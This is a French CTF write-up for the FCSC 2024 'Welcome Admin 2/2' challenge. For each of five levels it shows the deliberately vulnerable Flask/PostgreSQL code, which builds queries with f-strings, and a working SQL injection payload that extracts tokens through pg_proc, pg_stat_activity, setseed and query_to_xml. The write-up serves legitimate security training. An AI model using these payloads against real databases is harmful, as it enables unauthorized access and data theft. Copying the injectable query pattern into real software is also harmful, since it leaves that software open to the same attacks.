# README - Welcome Admin 2/2 Challenge Solution

## Description du Challenge

Dans un environnement complexe et sécurisé, un défi a été lancé pour tester vos compétences en SQL. Ce challenge, nommé **Welcome Admin 2/2**, fait partie du CTF (Capture The Flag) du FCSC 2024. L'objectif est de passer cinq étapes successives de validation en interagissant avec une application Flask connectée à une base de données PostgreSQL. 

### Objectif
Votre mission est d'exploiter des vulnérabilités SQL Injection pour obtenir le "flag" final. Chaque étape impose une nouvelle difficulté, et le flag ne peut être récupéré qu'en résolvant toutes les étapes dans l'ordre.

---

## Pré-requis

### Fichiers nécessaires
- **docker-compose.yml** : Fichier de configuration Docker.
- **welcome-admin.tar.xz** : Code source de l'application Flask.

### Installation
1. Téléchargez le fichier `docker-compose.yml` :
   ```bash
   curl https://hackropole.fr/challenges/fcsc2024-web-welcome-admin/docker-compose.public.yml -o docker-compose.yml
   ```
2. Placez le fichier dans un répertoire dédié.
3. Lancez le conteneur Docker :
   ```bash
   docker compose up
   ```
4. Accédez à l'application Flask via :
   [http://localhost:8000/](http://localhost:8000/).

⚠️ **Important** : Toute interaction autre que via le port réseau exposé (8000) ne sera pas considérée comme valide.

---

## Solution : Étapes et Payloads
Chaque étape nécessite une injection SQL spécifique. Voici les détails étape par étape :

### Étape 1 : Guest → Admin
#### Code de l'application :
```python
@app.route("/", methods=["GET", "POST"])
@login_for(Rank.GUEST, Rank.ADMIN, "/admin")
def level1(cursor: cursor, password: str):
    token = os.urandom(16).hex()
    cursor.execute(f"SELECT '{token}' = '{password}'")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 1:
        return False
    return bool(row[0])
```
#### Analyse
L'objectif est de contourner la validation en faisant en sorte que la requête SQL retourne toujours "true".

#### Payload utilisé :
```sql
' OR 1=1 --
```

---

### Étape 2 : Admin → Super Admin
#### Code de l'application :
```python
@app.route("/admin", methods=["GET", "POST"])
@login_for(Rank.ADMIN, Rank.SUPER_ADMIN, "/super-admin", FIRST_FLAG)
def level2(cursor: cursor, password: str):
    token = os.urandom(16).hex()
    cursor.execute(
        f"""
            CREATE FUNCTION check_password(_password text) RETURNS text
            AS $$
                BEGIN
                    IF _password = '{token}' THEN
                        RETURN _password;
                    END IF;
                    RETURN 'nope';
                END;
            $$
            IMMUTABLE LANGUAGE plpgsql;
        """
    )
    cursor.execute(f"SELECT  check_password('{password}')")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 1:
        return False
    return row[0] == token
```
#### Analyse
La fonction `check_password` est créée dynamiquement avec le token à l'intérieur de son corps. Il est possible d'extraire ce token depuis la table `pg_proc`.

#### Payload utilisé :
```sql
'||(select substring(prosrc, '[0-9a-f]{32}') from pg_proc where proname='check_password'))--
```

---

### Étape 3 : Super Admin → Hyper Admin
#### Code de l'application :
```python
@app.route("/super-admin", methods=["GET", "POST"])
@login_for(Rank.SUPER_ADMIN, Rank.HYPER_ADMIN, "/hyper-admin")
def level3(cursor: cursor, password: str):
    token = os.urandom(16).hex()
    cursor.execute(f"SELECT '{token}', '{password}';")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 2:
        return False
    return row[1] == token
```
#### Analyse
Le token est directement accessible dans la requête en cours. Nous pouvons l'extraire depuis la table `pg_stat_activity`.

#### Payload utilisé :
```sql
'|| substring(query,'[0-9a-f]{32}') FROM pg_stat_activity WHERE query LIKE '%query%';
```

---

### Étape 4 : Hyper Admin → Turbo Admin
#### Code de l'application :
```python
@app.route("/hyper-admin", methods=["GET", "POST"])
@login_for(Rank.HYPER_ADMIN, Rank.TURBO_ADMIN, "/turbo-admin")
def level4(cursor: cursor, password: str):
    cursor.execute(f"SELECT md5(random()::text), '{password}';")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 2:
        return False
    return row[0] == row[1]
```
#### Analyse
Le token est haché avec `md5(random()::text)`. Nous utilisons `setseed` pour forcer le générateur aléatoire à retourner une valeur contrôlée.

#### Payload utilisé :
```sql
4d359fe4a63dd3d663c742aa88ef514a' FROM pg_stat_activity WHERE ''=(select ''||setseed(0))||'';
```

---

### Étape 5 : Turbo Admin → Flag
#### Code de l'application :
```python
@app.route("/turbo-admin", methods=["GET", "POST"])
@login_for(Rank.TURBO_ADMIN, Rank.FLAG, "/flag")
def level5(cursor: cursor, password: str):
    table_name = "table_" + os.urandom(16).hex()
    col_name = "col_" + os.urandom(16).hex()
    token = os.urandom(16).hex()
    cursor.execute(
        f"""
        CREATE TABLE "{table_name}" (
          id serial PRIMARY KEY,
          "{col_name}" text
        );
        INSERT INTO "{table_name}"("{col_name}") VALUES ('{token}');
        """
    )
    cursor.execute(f"SELECT '{password}';")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 1:
        return False
    return row[0] == token
```
#### Analyse
Le token est inséré dans une table aléatoire avec une colonne aléatoire. En utilisant `query_to_xml`, nous pouvons extraire ces informations dynamiques.

#### Payload utilisé :
```sql
(SELECT 
    substring(substring(
        XMLSERIALIZE(
          DOCUMENT query_to_xml(
            'SELECT * FROM ' ||(
              SELECT string_agg(substring(table_name, 'table_[a-f0-9]{32}'), '-') 
              FROM information_schema.tables 
              WHERE table_name like 'table_%'
            ), 
            true, true, '') as text), 
        '>[a-z0-9]{32}<'), 
2, 32)
)
```

---

## Conclusion
Chaque étape exploite une vulnérabilité spécifique de l'application Flask et de PostgreSQL. Ces attaques illustrent l'importance d'une gestion rigoureuse des requêtes SQL et de la validation des entrées utilisateur. Une fois toutes les étapes validées, le flag final est obtenu.
